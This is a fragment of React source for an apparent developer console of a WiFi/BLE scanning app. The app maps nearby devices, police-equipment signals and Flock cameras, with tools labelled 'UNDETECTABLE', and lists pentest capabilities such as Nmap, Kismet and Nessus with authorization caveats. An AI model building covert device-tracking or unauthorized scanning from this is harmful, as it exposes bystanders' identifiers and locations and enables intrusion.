                  onClick={() => setExpandedEntry(expandedEntry === i ? null : i)}>
                  <span style={{ fontSize:18 }}>📦</span>
                  <div style={{ flex:1 }}>
                    <div style={{ display:'flex', alignItems:'center', gap:8, flexWrap:'wrap' }}>
                      <span style={{ fontSize:13, fontWeight:800, color:C.text }}>{entry.version}</span>
                      <span style={{ fontSize:10, color:C.dim }}>— {entry.date}</span>
                      <span style={{ fontSize:10, background:'rgba(255,69,58,0.12)', color:'#FF453A', padding:'1px 7px', borderRadius:20, border:'1px solid rgba(255,69,58,0.2)' }}>DEV ONLY</span>
                    </div>
                    <div style={{ fontSize:12, color:C.dim2, marginTop:2 }}>{entry.title}</div>
                  </div>
                  <span style={{ color:C.dim, fontSize:12, transform: expandedEntry===i ? 'rotate(90deg)' : 'none', transition:'transform 0.2s' }}>▶</span>
                </div>
                {expandedEntry === i && (
                  <div style={{ marginTop:12, paddingTop:12, borderTop:'1px solid rgba(0,200,255,0.08)' }}>
                    <ul style={{ margin:0, paddingLeft:18, listStyle:'disc' }}>
                      {entry.items.map((item, j) => (
                        <li key={j} style={{ fontSize:12, color:C.dim, lineHeight:1.8, marginBottom:2 }}>{item}</li>
                      ))}
                    </ul>
                    <div style={{ display:'flex', gap:6, flexWrap:'wrap', marginTop:10 }}>
                      {entry.platforms.map(p => (
                        <span key={p} style={{ fontSize:10, padding:'2px 8px', borderRadius:20, background:'rgba(0,200,255,0.07)', border:'1px solid rgba(0,200,255,0.15)', color:C.dim2 }}>{p}</span>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}

        {/* ── Architecture ── */}
        {section === 'architecture' && (
          <div>
            <div style={{ fontSize:13, fontWeight:700, color:C.accent, marginBottom:14 }}>🏗️ System Architecture</div>
            {[
              { title:'Frontend', icon:'⚛️', color:C.accent, items:[
                'React 18 + Vite — SPA served from /frontend/dist',
                'Leaflet for map rendering (react-leaflet wrapper)',
                'No external state library — useState/useRef/useEffect throughout',
                'DevPanel.jsx — all dev console UI in a single component file',
                '/#dev hash route — PIN-gated, never rendered for normal users',
              ]},
              { title:'Backend', icon:'🐍', color:C.green, items:[
                'FastAPI (Python 3.11+) — serves REST + WebSocket',
                'SQLite via raw sqlite3 — no ORM; direct row_factory=Row queries',
                'Uvicorn ASGI server — single process, threading where needed',
                'app/api/ — one router file per feature domain',
                'app/ingest/ — scanner, GPS, BLE, WiFi ingest modules',
                'app/db/database.py — get_db() returns thread-local connection',
              ]},
              { title:'Data Flow', icon:'🔄', color:C.orange, items:[
                'Scanner → raw_observations table (ts_ms, source, target_key, rssi, lat, lng, meta_json)',
                'encounters table — aggregated target appearances with peak_ts_ms + location',
                'route_points table — GPS track with speed + heading',
                'user_registry table — per-device identity, stats, account_id link',
                'WebSocket /ws/gps — real-time GPS position broadcast to all connected clients',
              ]},
              { title:'Build & Deploy', icon:'📦', color:'#BF5AF2', items:[
                'Development: uvicorn :8000 + vite dev :5173 (Vite proxies /api/* to backend)',
                'Production: npm run build → dist/ mounted as FastAPI static files',
                'Windows EXE: PyInstaller bundles backend + dist/ into single .exe via build_exe.py',
                'No Docker required — runs directly on Windows 10/11',
              ]},
            ].map(sec => (
              <div key={sec.title} className="dev-card" style={{ marginBottom:10 }}>
                <div style={{ fontSize:12, fontWeight:700, color:sec.color, marginBottom:8 }}>{sec.icon} {sec.title}</div>
                <ul style={{ margin:0, paddingLeft:18, listStyle:'disc' }}>
                  {sec.items.map((item, i) => (
                    <li key={i} style={{ fontSize:12, color:C.dim, lineHeight:1.8, marginBottom:1 }}>{item}</li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        )}

        {/* ── Setup Guide ── */}
        {section === 'setup' && (
          <div>
            <div style={{ fontSize:13, fontWeight:700, color:C.accent, marginBottom:14 }}>⚙️ Setup Guide</div>
            {SETUP_STEPS.map((step, i) => (
              <div key={i} className="dev-card" style={{ marginBottom:8, display:'flex', gap:12, alignItems:'flex-start' }}>
                <span style={{ fontSize:20, flexShrink:0 }}>{step.icon}</span>
                <div style={{ flex:1 }}>
                  <div style={{ fontSize:12, fontWeight:700, color:C.text, marginBottom:4 }}>{step.title}</div>
                  <div className="dev-terminal" style={{ padding:'6px 10px' }}>
                    <code style={{ fontSize:11, fontFamily:'monospace', color:C.accent }}>{step.cmd}</code>
                  </div>
                </div>
              </div>
            ))}
            <div className="dev-card" style={{ background:'rgba(255,159,10,0.05)', border:'1px solid rgba(255,159,10,0.2)', marginTop:4 }}>
              <div style={{ fontSize:12, color:C.orange, fontWeight:700, marginBottom:6 }}>⚠️ Windows Permissions</div>
              <div style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>
                WiFi monitor mode scanning requires Npcap in WinPcap-compatible mode. BLE scanning requires Bluetooth adapter and Windows 10+. Run as Administrator if scanner fails to start.
              </div>
            </div>
          </div>
        )}

        {/* ── Hard Rules ── */}
        {section === 'rules' && (
          <div>
            <div style={{ fontSize:13, fontWeight:700, color:'#FF453A', marginBottom:6 }}>⛔ Hard Rules — Never Implement</div>
            <div style={{ fontSize:11, color:C.dim, marginBottom:14, lineHeight:1.6 }}>
              These capabilities are documented in the Lab Reference Library for educational purposes only. They are never to be implemented, shipped, or tested on networks without explicit written authorization.
            </div>
            {HARD_RULES.map((rule, i) => (
              <div key={i} className="dev-card" style={{ marginBottom:8, display:'flex', gap:12, alignItems:'flex-start' }}>
                <span style={{ fontSize:20, flexShrink:0 }}>{rule.icon}</span>
                <div>
                  <div style={{ fontSize:12, fontWeight:700, color: rule.icon.startsWith('🚫') ? '#FF453A' : C.orange, marginBottom:3 }}>{rule.title}</div>
                  <div style={{ fontSize:11, color:C.dim, lineHeight:1.6 }}>{rule.desc}</div>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* ── Git Workflow ── */}
        {section === 'git' && (
          <div>
            <div style={{ fontSize:13, fontWeight:700, color:C.accent, marginBottom:14 }}>🌿 Git Workflow</div>
            {[
              { icon:'🌿', title:'Branch naming', desc:'feature/<short-name> for new features, fix/<issue> for bug fixes, sec/<topic> for security work. Never commit directly to main.' },
              { icon:'✅', title:'Commit convention', desc:'feat: / fix: / sec: / refactor: prefix. Keep subject ≤72 chars. Body explains the why, not the what. Co-authored commits reference the session that wrote the change.' },
              { icon:'🔍', title:'Before merging to main', desc:'npm run build must succeed with zero warnings. Backend must start clean with uvicorn. Manual smoke test: open /#dev → all 13 tabs render without console errors.' },
              { icon:'🏷️', title:'Versioning', desc:'Semantic versioning — major.minor.patch. Bump minor for new features, patch for fixes, major for breaking changes. Tag main with git tag v0.X after each release.' },
              { icon:'🔒', title:'Secrets in git', desc:'Never commit .env files, API keys, or credentials. The .gitignore covers common patterns but double-check before pushing. If a secret lands in history, rotate it immediately — git history rewrites are not sufficient.' },
              { icon:'📋', title:'PR checklist', desc:'1) All Hard Rules respected. 2) Security headers not broken. 3) CORS not widened. 4) Rate limits not removed. 5) PIN-gate not bypassed. 6) No new network-transmitting features without explicit authorization note.' },
            ].map((item, i) => (
              <div key={i} className="dev-card" style={{ marginBottom:8, display:'flex', gap:12, alignItems:'flex-start' }}>
                <span style={{ fontSize:18, flexShrink:0 }}>{item.icon}</span>
                <div>
                  <div style={{ fontSize:12, fontWeight:700, color:C.text, marginBottom:3 }}>{item.title}</div>
                  <div style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>{item.desc}</div>
                </div>
              </div>
            ))}
          </div>
        )}

      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Tab: Map  (full MapView with floating dev overlay)
// ─────────────────────────────────────────────────────────────────────────────
function TabMap({ data }) {
  const [showMarkers,     setShowMarkers]     = useState(true)
  const [showRoute,       setShowRoute]       = useState(true)
  const [showFlockCameras,setShowFlockCameras]= useState(true)
  const [hotspots,        setHotspots]        = useState([])
  const [stopperTrails,   setStopperTrails]   = useState([])
  const [flockCameras,    setFlockCameras]    = useState([])
  const [gpsPos,          setGpsPos]          = useState(null)
  const [overlayOpen,     setOverlayOpen]     = useState(false)
  const [probes,          setProbes]          = useState([])
  // Tool overlay toggles
  const [toolsOpen,      setToolsOpen]      = useState(false)
  const [showProbeBlips, setShowProbeBlips]  = useState(false)
  const [showAggressive, setShowAggressive]  = useState(false)
  const [showCellInfo,   setShowCellInfo]    = useState(false)
  const [cellInfo,       setCellInfo]        = useState({})
  const [aggressiveData, setAggressiveData]  = useState({})
  // Defer MapView mount by one paint so the flex container has settled its height
  const [mounted,         setMounted]         = useState(false)
  useEffect(() => { const t = setTimeout(() => setMounted(true), 80); return () => clearTimeout(t) }, [])

  const isMob = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)

  // GPS position from backend (dev console has no user geolocation relay)
  useEffect(() => {
    const poll = () => {
      fetch('/gps/status')
        .then(r => r.json())
        .then(d => {
          if (d?.lat != null && d?.lon != null) setGpsPos({ lat: d.lat, lng: d.lon })
        })
        .catch(() => {})
    }
    poll()
    const id = setInterval(poll, isMob ? 4000 : 2000)
    return () => clearInterval(id)
  }, [])

  // Hotspots (slower cadence)
  useEffect(() => {
    const poll = () => {
      fetch('/hotspots?limit=50')
        .then(r => r.json())
        .then(d => setHotspots(d?.hotspots || []))
        .catch(() => {})
    }
    poll()
    const id = setInterval(poll, 60000)
    return () => clearInterval(id)
  }, [])

  // Stopper trails
  useEffect(() => {
    const poll = () => {
      fetch('/stoppers/active?window_min=30')
        .then(r => r.json())
        .then(d => setStopperTrails(Array.isArray(d) ? d : []))
        .catch(() => {})
    }
    poll()
    const id = setInterval(poll, isMob ? 20000 : 10000)
    return () => clearInterval(id)
  }, [])

  // Flock cameras (slow poll)
  useEffect(() => {
    const poll = () => {
      fetch('/flock/cameras')
        .then(r => r.json())
        .then(d => setFlockCameras(d?.cameras || []))
        .catch(() => {})
    }
    poll()
    const id = setInterval(poll, 30 * 60 * 1000)
    return () => clearInterval(id)
  }, [])

  // Probe data for overlay + tool panel
  useEffect(() => {
    if (!overlayOpen && !showProbeBlips) return
    const poll = () => {
      fetch('/scan/probes?limit=20')
        .then(r => r.json())
        .then(d => setProbes(d?.probes || []))
        .catch(() => {})
    }
    poll()
    const id = setInterval(poll, isMob ? 10000 : 5000)
    return () => clearInterval(id)
  }, [overlayOpen, showProbeBlips])

  // Cell info polling
  useEffect(() => {
    if (!showCellInfo) return
    const poll = () => fetch('/scan/cell').then(r=>r.json()).then(d=>setCellInfo(d?.cell||{})).catch(()=>{})
    poll()
    const id = setInterval(poll, isMob ? 10000 : 5000)
    return () => clearInterval(id)
  }, [showCellInfo])

  // Aggressive data polling
  useEffect(() => {
    if (!showAggressive) return
    const poll = () => fetch('/scan/aggressive').then(r=>r.json()).then(d=>setAggressiveData(d||{})).catch(()=>{})
    poll()
    const id = setInterval(poll, isMob ? 10000 : 5000)
    return () => clearInterval(id)
  }, [showAggressive])

  const activeStoppers = stopperTrails.filter(s => Date.now() - s.last_seen_ms < 15 * 60 * 1000)

  return (
    <div style={{ position:'absolute', inset:0, display:'flex', flexDirection:'column' }}>
      {!mounted && (
        <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center', background:C.bg }}>
          <span style={{ color:C.dim, fontSize:13 }}>Loading map…</span>
        </div>
      )}
      {mounted && <MapView
        heatCells={data.heatCells}
        encounters={data.encounters}
        showMarkers={showMarkers}
        userPos={gpsPos}
        routePoints={data.routePoints}
        showRoute={showRoute}
        hotspots={hotspots}
        stopperTrails={stopperTrails}
        flockCameras={flockCameras}
        showFlockCameras={showFlockCameras}
        tailKeys={new Set()}
        activeUsers={[]}
        myUsername="dev"
        sidebarState="closed"
      />}

      {/* Map control buttons — top right */}
      <div style={{
        position:'absolute', top:12, right:12, zIndex:1000,
        display:'flex', flexDirection:'column', gap:6,
      }}>
        <button onClick={() => setShowMarkers(v => !v)} style={{
          background: showMarkers ? 'rgba(0,200,255,0.2)' : 'rgba(13,19,34,0.85)',
          border:`1px solid ${showMarkers ? C.accent : C.border}`,
          color: showMarkers ? C.accent : C.dim,
          borderRadius:8, padding:'5px 10px', cursor:'pointer', fontFamily:C.font,
          fontSize:11, fontWeight:600, backdropFilter:'blur(8px)',
        }}>📍 Markers</button>
        <button onClick={() => setShowFlockCameras(v => !v)} style={{
          background: showFlockCameras ? 'rgba(180,0,255,0.15)' : 'rgba(13,19,34,0.85)',
          border:`1px solid ${showFlockCameras ? '#b400ff' : C.border}`,
          color: showFlockCameras ? '#cc44ff' : C.dim,
          borderRadius:8, padding:'5px 10px', cursor:'pointer', fontFamily:C.font,
          fontSize:11, fontWeight:600, backdropFilter:'blur(8px)',
        }}>📷 Flock</button>
        <button onClick={() => setShowRoute(v => !v)} style={{
          background: showRoute ? 'rgba(0,200,255,0.2)' : 'rgba(13,19,34,0.85)',
          border:`1px solid ${showRoute ? C.accent : C.border}`,
          color: showRoute ? C.accent : C.dim,
          borderRadius:8, padding:'5px 10px', cursor:'pointer', fontFamily:C.font,
          fontSize:11, fontWeight:600, backdropFilter:'blur(8px)',
        }}>〰 Route</button>
      </div>

      {/* Tool toggles bar — bottom left */}
      <div style={{
        position:'absolute', bottom:20, left:12, zIndex:1000,
        display:'flex', flexDirection:'column', gap:6,
      }}>
        {/* Tool strip toggle */}
        <button onClick={() => setToolsOpen(v => !v)} style={{
          background: toolsOpen ? 'rgba(0,200,255,0.15)' : 'rgba(13,19,34,0.85)',
          border:`1px solid ${toolsOpen ? C.accent : C.border}`,
          color: toolsOpen ? C.accent : C.dim,
          borderRadius:10, padding:'7px 12px', cursor:'pointer', fontFamily:C.font,
          fontSize:12, fontWeight:700, backdropFilter:'blur(8px)',
          display:'flex', alignItems:'center', gap:6,
        }}>
          🛠 Tools
        </button>

        {/* Tool toggles — expanded */}
        {toolsOpen && (() => {
          const TOOL_BTNS = [
            {
              id: 'probes', icon: '📡', label: 'Probes',
              on: showProbeBlips, set: setShowProbeBlips,
              drLabel: 'UNDETECTABLE', drColor: '#30D158',
              count: probes.length,
            },
            {
              id: 'stoppers', icon: '🚔', label: 'Stoppers',
              on: true, set: () => {},
              drLabel: 'UNDETECTABLE', drColor: '#30D158',
              count: stopperTrails.filter(s => Date.now() - s.last_seen_ms < 15 * 60 * 1000).length,
              fixed: true,
            },
            {
              id: 'aggressive', icon: '🎯', label: 'Aggressive',
              on: showAggressive, set: setShowAggressive,
              drLabel: 'LOW RISK', drColor: '#30D158',
              count: (aggressiveData.fleet_wifi_count || 0) + (aggressiveData.axon_ble_count || 0) || null,
            },
            {
              id: 'cell', icon: '📶', label: 'Cell',
              on: showCellInfo, set: setShowCellInfo,
              drLabel: 'UNDETECTABLE', drColor: '#30D158',
              count: null,
            },
          ]
          return TOOL_BTNS.map(t => (
            <button
              key={t.id}
              onClick={() => !t.fixed && t.set(v => !v)}
              style={{
                background: t.on ? 'rgba(0,200,255,0.12)' : 'rgba(13,19,34,0.85)',
                border:`1px solid ${t.on ? 'rgba(0,200,255,0.3)' : C.border}`,
                color: t.on ? C.accent : C.dim,
                borderRadius:10, padding:'6px 10px', cursor: t.fixed ? 'default' : 'pointer',
                fontFamily:C.font, fontSize:11, fontWeight:600,
                backdropFilter:'blur(8px)', textAlign:'left',
                display:'flex', flexDirection:'column', gap:2, minWidth:110,
              }}
            >
              <div style={{ display:'flex', alignItems:'center', gap:5 }}>
                <span>{t.icon}</span>
                <span style={{ flex:1 }}>{t.label}</span>
                {t.count > 0 && <span style={{ fontSize:9, background:'rgba(0,200,255,0.15)', borderRadius:8, padding:'1px 5px', color:C.accent }}>{t.count}</span>}
                {t.fixed && <span style={{ fontSize:9, color:C.dim2 }}>always on</span>}
              </div>
              <div style={{ fontSize:9, color:t.drColor, paddingLeft:18 }}>{t.drLabel}</div>
            </button>
          ))
        })()}

        {/* Dev overlay toggle */}
        <button onClick={() => setOverlayOpen(v => !v)} style={{
          background: overlayOpen ? 'rgba(255,159,10,0.2)' : 'rgba(13,19,34,0.85)',
          border:`1px solid ${overlayOpen ? C.orange : C.border}`,
          color: overlayOpen ? C.orange : C.dim,
          borderRadius:10, padding:'7px 12px', cursor:'pointer', fontFamily:C.font,
          fontSize:12, fontWeight:700, backdropFilter:'blur(8px)',
          display:'flex', alignItems:'center', gap:6,
        }}>
          🔬 Dev Info
          {activeStoppers.length > 0 && (
            <span style={{ background:'rgba(255,69,58,0.3)', border:'1px solid rgba(255,69,58,0.5)', color:'#ff453a', borderRadius:10, fontSize:10, padding:'1px 6px' }}>
              {activeStoppers.length}
            </span>
          )}
        </button>
      </div>

      {/* Cell info floating card */}
      {showCellInfo && cellInfo && Object.keys(cellInfo).length > 0 && (
        <div style={{
          position:'absolute', top:60, left:12, zIndex:999,
          background:'rgba(13,19,34,0.92)', border:`1px solid ${C.border}`,
          borderRadius:10, padding:'10px 14px', fontFamily:C.font,
          backdropFilter:'blur(12px)', fontSize:11, minWidth:180,
        }}>
          <div style={{ fontSize:10, fontWeight:700, color:C.accent, marginBottom:6, letterSpacing:0.5 }}>CELL SIGNAL</div>
          {Object.entries(cellInfo).slice(0,6).map(([k,v]) => (
            <div key={k} style={{ display:'flex', justifyContent:'space-between', gap:12, padding:'2px 0', borderBottom:`1px solid rgba(255,255,255,0.04)` }}>
              <span style={{ color:C.dim }}>{k}</span>
              <span style={{ color:C.text, fontWeight:600 }}>{String(v)}</span>
            </div>
          ))}
        </div>
      )}

      {/* Aggressive scanner card */}
      {showAggressive && aggressiveData && (
        <div style={{
          position:'absolute', top: showCellInfo ? 200 : 60, left:12, zIndex:999,
          background:'rgba(13,19,34,0.92)', border:`1px solid rgba(255,159,10,0.2)`,
          borderRadius:10, padding:'10px 14px', fontFamily:C.font,
          backdropFilter:'blur(12px)', fontSize:11, minWidth:180,
        }}>
          <div style={{ fontSize:10, fontWeight:700, color:C.orange, marginBottom:6, letterSpacing:0.5 }}>AGGRESSIVE SCAN</div>
          <div style={{ display:'flex', justifyContent:'space-between', gap:12, padding:'3px 0' }}>
            <span style={{ color:C.dim }}>Fleet WiFi hits</span>
            <span style={{ color:C.text, fontWeight:700 }}>{aggressiveData.fleet_wifi_count || 0}</span>
          </div>
          <div style={{ display:'flex', justifyContent:'space-between', gap:12, padding:'3px 0' }}>
            <span style={{ color:C.dim }}>Axon BLE hits</span>
            <span style={{ color:C.text, fontWeight:700 }}>{aggressiveData.axon_ble_count || 0}</span>
          </div>
          {aggressiveData.top_fleet_ssid && (
            <div style={{ marginTop:6, padding:'4px 6px', background:'rgba(255,159,10,0.07)', borderRadius:6, fontSize:10, color:C.orange }}>
              Top: {aggressiveData.top_fleet_ssid}
            </div>
          )}
        </div>
      )}

      {/* Dev overlay panel */}
      {overlayOpen && (
        <div style={{
          position:'absolute', bottom:60, right:12, zIndex:1000,
          background:'rgba(13,19,34,0.95)', border:`1px solid ${C.border}`,
          borderRadius:12, padding:'12px 14px', width:260,
          backdropFilter:'blur(16px)', fontFamily:C.font,
          display:'flex', flexDirection:'column', gap:10,
        }}>
          {/* Stats row */}
          <div style={{ display:'flex', gap:8 }}>
            {[
              { label:'Stoppers', val:activeStoppers.length, color:'#ff453a' },
              { label:'Probes',   val:probes.length,         color:C.accent },
              { label:'Flock',    val:flockCameras.length,   color:'#cc44ff' },
              { label:'Hits',     val:data.encounters.length, color:C.green },
            ].map(s => (
              <div key={s.label} style={{ flex:1, background:'rgba(255,255,255,0.04)', borderRadius:8, padding:'6px 4px', textAlign:'center' }}>
                <div style={{ fontSize:15, fontWeight:800, color:s.color }}>{s.val}</div>
                <div style={{ fontSize:9, color:C.dim, marginTop:1 }}>{s.label}</div>
              </div>
            ))}
          </div>

          {/* Active stoppers */}
          {activeStoppers.length > 0 && (
            <div>
              <div style={{ fontSize:10, fontWeight:700, color:'#ff453a', marginBottom:4, letterSpacing:0.5 }}>ACTIVE STOPPERS</div>
              {activeStoppers.slice(0, 4).map((s, i) => {
                const ageMin = Math.round((Date.now() - s.last_seen_ms) / 60000)
                return (
                  <div key={i} style={{ display:'flex', justifyContent:'space-between', alignItems:'center', fontSize:11, padding:'3px 0', borderBottom:'1px solid rgba(255,255,255,0.04)' }}>
                    <span style={{ color:C.text, maxWidth:150, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{s.ssid || s.mac || 'Unknown'}</span>
                    <span style={{ color:C.dim, fontSize:10 }}>{ageMin}m ago</span>
                  </div>
                )
              })}
            </div>
          )}

          {/* Recent probes */}
          {probes.length > 0 && (
            <div>
              <div style={{ fontSize:10, fontWeight:700, color:C.accent, marginBottom:4, letterSpacing:0.5 }}>RECENT PROBES</div>
              {probes.slice(0, 4).map((p, i) => (
                <div key={i} style={{ display:'flex', justifyContent:'space-between', alignItems:'center', fontSize:11, padding:'3px 0', borderBottom:'1px solid rgba(255,255,255,0.04)' }}>
                  <span style={{ color:C.text, maxWidth:150, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{p.ssid || p.mac || 'Unknown'}</span>
                  <span style={{ color:C.dim, fontSize:10 }}>{p.rssi ?? '—'} dBm</span>
                </div>
              ))}
            </div>
          )}

          {/* Scanner status */}
          <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', fontSize:11 }}>
            <span style={{ color:C.dim }}>Scanner</span>
            <span style={{ color: data.status?.running ? C.green : C.dim, fontWeight:700 }}>
              {data.status?.running ? '● RUNNING' : '○ IDLE'}
            </span>
          </div>

          <a href="/#dev" style={{
            display:'block', textAlign:'center', fontSize:11, fontWeight:700,
            color:C.orange, textDecoration:'none',
            background:'rgba(255,159,10,0.08)', border:`1px solid rgba(255,159,10,0.2)`,
            borderRadius:8, padding:'6px',
          }}>Open Full Dev Console →</a>
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Toolkit tab — Pentest capability reference (Ideas C–Z)
// ─────────────────────────────────────────────────────────────────────────────
const TOOLKIT_IDEAS = [
  { id:'C', icon:'📡', name:'Passive Wired Traffic Capture & Protocol Analytics', risk:'Passive / Low', riskColor:'#30D158', invNet:true,
    invNetNote:'Core .Net ingestion module — parse pcapng for protocol metadata, DNS, and flow inventory.',
    purpose:'Observe network behavior to derive asset inventory, protocols in use, auth flows, and shadow IT without probing.',
    access:'SPAN/TAP port or capture point; or host-level capture on authorized endpoint.',
    data:'PCAP/PCAPNG, timestamps, protocol metadata, endpoints observed, DNS names (where visible).',
    workflow:'Configure capture point → apply capture filters → collect during defined windows → parse and extract flows/services → annotate findings.',
    tools:'Wireshark / dumpcap',
    risks:'Privacy exposure; large captures can strain storage; on-host capture may affect performance.',
    mitigations:'Strict capture filters and short windows; avoid collecting payloads when not needed; legal-approved capture policies.',
    legal:'Ensure monitoring banners/consent where required; document capture boundaries. SP 800-115 warns captures can include personal data.' },
  { id:'D', icon:'📶', name:'Passive Wireless RF Survey & AP/Client Inventory', risk:'Passive / Low', riskColor:'#30D158', invNet:true,
    invNetNote:'Feed RF survey data into .Net asset inventory and rogue AP detection workflow.',
    purpose:'Identify SSIDs/BSSIDs, encryption posture, channels, client roaming patterns, and rogue infrastructure in RF range.',
    access:'Physical proximity and monitor-mode capable radio; no credentials required for basic beacon/probe observation.',
    data:'SSIDs/BSSIDs, channels/band, signal strength, observed client identifiers (subject to MAC randomization), timestamps, optional location.',
    workflow:'Configure sensors → channel hopping → collect beacons/probes → correlate BSSIDs to sites → build heatmaps and rogue AP alerts.',
    tools:'Kismet Wireless',
    risks:'RF monitoring typically low impact, but can expose sensitive identifiers; physical presence considerations.',
    mitigations:'MAC redaction/minimization; opt-in location tagging; clear signage/coordination in facilities.',
    legal:'Treat RF data as sensitive; follow facility policies and local regulations regarding monitoring and location data.' },
  { id:'E', icon:'📢', name:'Passive Broadcast/Multicast Service Discovery', risk:'Low', riskColor:'#30D158', invNet:true,
    invNetNote:'Passive name-resolution listener enriches .Net asset identity without active scanning.',
    purpose:'Infer devices and services from local-link protocols (DHCP, mDNS, LLMNR); identify insecure name-resolution dependencies.',
    access:'Network presence on segment (or capture access); no authentication required.',
    data:'Hostnames, service advertisements, local name resolution behavior, IP/MAC associations.',
    workflow:'Listen for broadcasts → parse protocol fields → build "service directory" → flag insecure fallback name resolution.',
    tools:'Wireshark / passive capture',
    risks:'Minimal system impact, but captured metadata can be sensitive.',
    mitigations:'Passive-only mode; redact identifiers in exports; adhere to ROE capture boundaries.',
    legal:'Ensure monitoring is within authorization and privacy constraints.' },
  { id:'F', icon:'🗺', name:'Layer-2 Topology via LLDP/CDP + SNMP Enrichment', risk:'Low–Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'Topology graph module for .Net — visualize switch–AP–router adjacencies from discovered data.',
    purpose:'Build physical/logical topology graph (switch–switch, switch–AP, switch–router) and enrich with device identity/capabilities.',
    access:'Network adjacency; SNMP read-only community/credentials; LLDP/CDP passive capture or device query access.',
    data:'Neighbor relationships, device identity/capability ads, interface metadata, management IPs.',
    workflow:'Collect LLDP/CDP frames → ingest SNMP where authorized → correlate to device inventory → render topology graph.',
    tools:'Wireshark (passive LLDP/CDP), SNMP tooling (SNMPv3)',
    risks:'SNMP misconfiguration could expose data; querying can load devices if aggressive.',
    mitigations:'Rate-limit polling; prefer passive LLDP/CDP; least-privilege SNMPv3; exclude fragile legacy gear.',
    legal:'Ensure device management access is explicitly authorized.' },
  { id:'G', icon:'🔍', name:'Active Host Discovery with Pacing & L2 Awareness', risk:'Low', riskColor:'#30D158', invNet:true,
    invNetNote:'Reliable live-hosts list — foundational for .Net asset scope and follow-on scans.',
    purpose:'Produce a reliable "live hosts" list including devices that do not respond to higher-layer probes.',
    access:'L2 adjacency for ARP-based discovery; L3 reachability for ICMP/TCP liveness checks.',
    data:'IP/MAC mappings, response timings, liveness evidence.',
    workflow:'Define subnet(s) → run low-rate discovery → reconcile with passive observations and DHCP logs → maintain alive asset set.',
    tools:'Nmap (host discovery modes), Scapy (ARP)',
    risks:'Generally low, but can trigger monitoring alerts; aggressive probing can strain networks.',
    mitigations:'Low concurrency by default; allowlist only; stop on packet loss spikes; maintenance-window option for high-volume discovery.',
    legal:'Must be within scope and approved testing windows.' },
  { id:'H', icon:'🔌', name:'Port/Service/Version Scanning with Structured Outputs', risk:'Low–Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'Core .Net attack-surface module — structured XML output drives asset/service normalization and diff reports.',
    purpose:'Identify exposed services, versions, and attack surface changes across time; support reconnaissance and regression testing.',
    access:'Network reachability to targets; no authentication required for basic scans.',
    data:'Open ports, service banners/versions, latencies, scan metadata.',
    workflow:'Run paced scans → store machine-readable results → compare to baselines → highlight new exposures and probable misconfigs.',
    tools:'Nmap (XML output recommended for automation)',
    risks:'Can trigger IDS/IPS; aggressive scanning can overload fragile services.',
    mitigations:'Rate limits; per-service fragility profiles; safe scan profiles; automatic backoff on errors.',
    legal:'Ensure targets, timing, and intensity are authorized.' },
  { id:'I', icon:'📜', name:'Scripted Enumeration Policy Engine (Safe vs Intrusive)', risk:'Low–High', riskColor:'#FF9F0A', invNet:true,
    invNetNote:'.Net orchestrates NSE script packs by risk tier — "safe" by default, intrusive requires secondary approval.',
    purpose:'Provide modular, script-based enumeration while enforcing script risk tiers and approvals.',
    access:'Varies by script; generally network access, sometimes authentication.',
    data:'Service-specific metadata, configuration hints, vulnerability indicators.',
    workflow:'Choose script packs by risk tier → execute with guardrails → parse outputs → attach evidence to assets.',
    tools:'Nmap NSE (categories: safe, intrusive, vuln, exploit, dos)',
    risks:'Intrusive/dos/exploit scripts can disrupt hosts or create audit noise.',
    mitigations:'Enforce category-based gating (safe by default); require secondary approval for intrusive; preflight "dry run" listing.',
    legal:'Running intrusive scripts without explicit permission is prohibited; record approvals and script provenance.' },
  { id:'J', icon:'🛡', name:'Vulnerability Scanning with Safety Modes & Plugin Governance', risk:'Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'.Net ingests .nessus XML exports — normalizes CVEs, CVSS scores, and maps to asset inventory.',
    purpose:'Automate vulnerability identification while minimizing outages via policy-controlled checks.',
    access:'Network access; optionally credentials for authenticated checks.',
    data:'Findings with plugin outputs/evidence, severity scoring, affected services/products; scan policy and tuning metadata.',
    workflow:'Select target set and scan policy → run with safe checks default → triage results → validate critical findings in controlled windows.',
    tools:'Tenable Nessus / Tenable VM',
    risks:'Potential service disruption; credential handling sensitivity; noisy scanning may trip defenses.',
    mitigations:'Safe checks default; explicit "intrusive" toggle; maintenance windows; stop-on-unresponsive; credential vault integration.',
    legal:'Ensure approvals for authenticated scanning and for any intrusive plugin families.' },
  { id:'K', icon:'🔓', name:'OpenVAS/GVM Integration with Feed Governance', risk:'Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'Open-source vulnerability scan source for .Net — GMP API enables orchestration and result ingestion.',
    purpose:'Open-source vulnerability scan capabilities, including authenticated/unauthenticated checks, with GMP-based orchestration.',
    access:'Network access; optional credentials.',
    data:'VT results (with evidence), host/service inventory, scan configuration and tuning metadata.',
    workflow:'Sync vulnerability test feeds → run scans via GMP API → ingest results → normalize to CVE/CVSS → report.',
    tools:'Greenbone OpenVAS / Greenbone Vulnerability Management (GVM)',
    risks:'Similar to other scanners: load, false positives, credential sensitivity.',
    mitigations:'Conservative scan tuning; separate credential scopes; schedule scans; safe profiles by default.',
    legal:'Same authorization requirements as all vulnerability assessment tooling.' },
  { id:'L', icon:'🌐', name:'Web Intercept Proxy & Session Replay Workspace', risk:'Low–Medium', riskColor:'#FFD60A', invNet:true,
    invNetNote:'.Net web module ingests Burp/ZAP request logs — surfaces endpoints, parameters, and session flows for issue normalization.',
    purpose:'Centralize web/API request capture, modification, replay, and evidence attachment for manual testing.',
    access:'Tester-controlled client device/browser configuration; network access to target app; may require app authentication.',
    data:'HTTP requests/responses, session flows, cookies/tokens (sensitive), timing, endpoints, parameter structures.',
